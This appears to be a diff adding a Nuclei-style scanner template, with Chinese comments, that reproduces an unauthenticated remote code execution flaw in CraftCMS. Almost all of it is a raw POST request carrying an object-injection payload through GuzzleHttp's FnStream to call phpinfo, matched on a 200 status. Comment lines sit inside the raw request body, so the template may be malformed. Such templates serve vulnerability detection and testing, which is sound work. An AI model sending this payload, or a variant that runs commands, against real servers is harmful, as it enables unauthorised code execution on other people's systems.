@@ -1,0 +1,42 @@
+id: poc-tngcyp4ax876bxqg
+info:
+  name: CraftCMS 未授权RCE漏洞复现
+  author: hacktwo
+  severity: high
+  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/tngcyp4ax876bxqg'
+  tags: rce,unauth,2024
+  metadata:
+    source: yuque-hacktwo-dtdx2v
+    doc-slug: tngcyp4ax876bxqg
+    fofa: 暂无
+http:
+- raw:
+  - 'POST /index.php HTTP/1.1
+
+
+    Content-Type: application/x-www-form-urlencoded
+
+
+
+
+    action=conditions/render&test[userCondition]=craft\elements\conditions\users\UserCondition&config={"name":"test[userCondition]","as xyz":{"class":"\\GuzzleHttp\\Psr7\\FnStream",    "__construct()": [{"close":null}],"_fn_close":"phpinfo"}}
+
+
+    # 响应代码特征
+
+    200
+
+
+    # 响应内容特征
+
+    PHP Version
+
+
+    # 上传文件定位
+
+    暂无'
+  redirects: false
+  matchers:
+  - status:
+    - 200
+    type: status
